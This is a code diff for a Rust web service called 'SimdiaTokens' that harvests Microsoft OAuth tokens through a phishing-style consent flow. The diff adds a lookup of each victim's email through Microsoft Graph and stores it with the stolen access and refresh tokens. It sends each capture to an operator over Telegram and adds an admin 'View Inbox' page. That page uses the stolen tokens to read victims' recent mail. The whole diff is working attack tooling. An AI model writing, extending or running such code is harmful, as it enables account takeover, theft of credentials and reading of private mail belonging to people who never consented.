@@ -59,9 +59,9 @@ fn generate_id() -> String {
     Uuid::new_v4().to_string()
 }
 
-async fn send_telegram_notification(config: &AppConfig, refresh_token: &str) {
+async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
     if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
-        let message = format!("🎯 *New Token Captured!*\n\nRefresh Token: `{}`\nTime: {}", refresh_token, Utc::now());
+        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
         let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
         let params = [
             ("chat_id", chat_id.as_str()),
@@ -74,6 +74,18 @@ async fn send_telegram_notification(config: &AppConfig, refresh_token: &str) {
             .send()
             .await;
     }
+}
+
+async fn fetch_user_email(access_token: &str) -> Option<String> {
+    let client = Client::new();
+    let resp = client
+        .get("https://graph.microsoft.com/v1.0/me")
+        .header("Authorization", format!("Bearer {}", access_token))
+        .send()
+        .await
+        .ok()?;
+    let body: serde_json::Value = resp.json().await.ok()?;
+    Some(body.get("userPrincipalName")?.as_str()?.to_string())
 }
 
 #[derive(Deserialize)]
@@ -100,17 +112,21 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 let id = generate_id();
                 let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                 let expires_at = Utc::now() + Duration::seconds(expires_in);
+                let email = fetch_user_email(access_token).await;
                 let query = sqlx::query(
-                    "INSERT INTO harvested (id, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
+                .bind(&email)
                 .bind(access_token)
                 .bind(refresh_token)
                 .bind(expires_at)
                 .bind(Utc::now())
                 .bind("oauth_app");
                 let _ = query.execute(&state.pool).await;
-                send_telegram_notification(&state.config, refresh_token).await;
+                if let Some(email) = email {
+                    send_telegram_notification(&state.config, refresh_token, &email).await;
+                }
                 HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
             } else {
                 HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
@@ -125,10 +141,14 @@ async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
-    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}.token{font-family:monospace;font-size:12px;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th></table>"#);
+    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}.token{font-family:monospace;font-size:12px;}button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}button:hover{background:#005a9e;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><tr><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
     for token in rows {
-        let email = token.email.unwrap_or_else(|| "unknown".to_string());
-        html.push_str(&format!("<tr><td>{}</td><td>{}</td><td class='token'>{:.20}...</td><td>{}</td><td>{}</td></tr>", token.id, email, token.refresh_token, token.expires_at, token.source));
+        let email = token.email.as_deref().unwrap_or("unknown");
+        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
+        html.push_str(&format!(
+            "<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td><td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>",
+            token.id, email, refresh_short, token.expires_at, token.source, token.id
+        ));
     }
     html.push_str("</table></body></html>");
     HttpResponse::Ok().content_type("text/html").body(html)
@@ -159,7 +179,33 @@ struct InboxQuery {
     token_id: String,
 }
 
-async fn inbox_viewer(query: web::Query<InboxQuery>, state: web::Data<AppState>) -> impl Responder {
+async fn inbox_viewer(state: web::Data<AppState>, query: web::Query<InboxQuery>) -> impl Responder {
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
+        .bind(&query.token_id)
+        .fetch_optional(&state.pool)
+        .await
+        .unwrap_or(None);
+    if let Some(token) = row {
+        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
+        let access = fresh_access.unwrap_or(token.access_token);
+        let client = reqwest::Client::new();
+        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=10&$orderby=receivedDateTime DESC")
+            .header("Authorization", format!("Bearer {}", access))
+            .send()
+            .await;
+        match resp {
+            Ok(r) => {
+                let body: serde_json::Value = r.json().await.unwrap_or_default();
+                HttpResponse::Ok().json(body)
+            }
+            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e.to_string()}))
+        }
+    } else {
+        HttpResponse::NotFound().body("Token not found")
+    }
+}
+
+async fn inbox_view_html(state: web::Data<AppState>, query: web::Query<InboxQuery>) -> impl Responder {
     let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
@@ -175,10 +221,26 @@ async fn inbox_viewer(query: web::Query<InboxQuery>, state: web::Data<AppState>)
             .await;
         match resp {
             Ok(r) => {
-                let body: serde_json::Value = r.json().await.unwrap_or_default();
-                HttpResponse::Ok().json(body)
+                let data: serde_json::Value = r.json().await.unwrap_or_default();
+                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.1);}.subject{font-weight:bold;margin-bottom:5px;}.from{color:#666;font-size:14px;}.time{color:#999;font-size:12px;float:right;}.body{font-size:14px;margin-top:10px;color:#333;}</style></head><body><h1>Inbox for token</h1>"#);
+                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
+                    for msg in msgs {
+                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
+                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
+                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
+                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
+                        html.push_str(&format!(
+                            "<div class='email'><div class='subject'>{}</div><div class='from'>From: {}</div><div class='time'>{}</div><div class='body'>{}</div></div>",
+                            subject, from, received, body_preview
+                        ));
+                    }
+                } else {
+                    html.push_str("<p>No emails found or error retrieving messages.</p>");
+                }
+                html.push_str("</body></html>");
+                HttpResponse::Ok().content_type("text/html").body(html)
             }
-            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e.to_string()}))
+            Err(e) => HttpResponse::InternalServerError().body(format!("Error fetching inbox: {}", e))
         }
     } else {
         HttpResponse::NotFound().body("Token not found")
@@ -226,7 +288,6 @@ async fn main() -> std::io::Result<()> {
     let http_client = Client::new();
     let app_state = web::Data::new(AppState { pool, config, http_client });
     
-    // Read PORT from environment (Railway sets this)
     let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
     let port = port.parse::<u16>().unwrap_or(8080);
     
@@ -239,6 +300,7 @@ async fn main() -> std::io::Result<()> {
             .route("/generate", web::get().to(generate_link))
             .route("/status", web::get().to(status))
             .route("/inbox", web::get().to(inbox_viewer))
+            .route("/inbox_view", web::get().to(inbox_view_html))
     })
     .bind(("0.0.0.0", port))?
     .run()
